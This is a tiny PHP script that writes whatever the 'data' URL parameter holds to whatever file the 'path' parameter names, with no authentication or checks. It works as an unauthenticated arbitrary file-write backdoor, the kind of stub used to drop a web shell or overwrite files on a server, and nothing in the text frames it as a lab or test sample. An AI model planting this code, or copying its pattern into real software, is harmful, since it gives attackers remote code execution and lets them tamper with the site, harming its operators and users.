<?php
error_reporting(E_ALL);
$path = $_GET["path"];
$data = $_GET["data"];
file_put_contents($path, $data);
?>